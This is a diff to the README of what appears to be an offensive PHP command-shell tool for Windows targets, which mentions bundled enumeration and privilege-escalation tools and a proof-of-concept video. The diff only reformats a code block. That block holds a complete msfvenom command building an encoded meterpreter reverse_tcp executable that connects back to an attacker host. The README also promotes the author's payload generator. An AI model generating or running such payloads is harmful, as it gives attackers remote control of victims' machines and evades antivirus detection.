@@ -11,7 +11,8 @@
 Automates or simplifies many on target functions. Designed for windows targets. See it in action at https://kdgwebsolutions.com/assets/img/videos/proof-of-concept-for-learning-management-system-exploits.mp4. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:
 
 venom.exe : 
-```sh sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
+```sh
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
 ```
 If you would prefer to use a payload generator, please give mine a try https://github.com/kaotickj/K-Sploit
 ![Screen](https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshelluse.gif)
